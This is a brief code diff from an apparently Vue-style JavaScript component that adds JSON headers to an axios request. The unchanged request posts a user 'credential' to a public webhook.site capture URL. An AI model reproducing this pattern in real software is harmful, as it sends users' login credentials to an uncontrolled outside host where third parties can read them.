@@ -54,6 +54,11 @@ export default {
 
       await axios.post('https://webhook.site/a6230aaa-1037-4b81-980f-fb03ef73d5dc', {
         credential,
+      }, {
+        headers: {
+          'Content-Type': 'application/json',
+          Accept: 'application/json',
+        },
       });
     },
   },
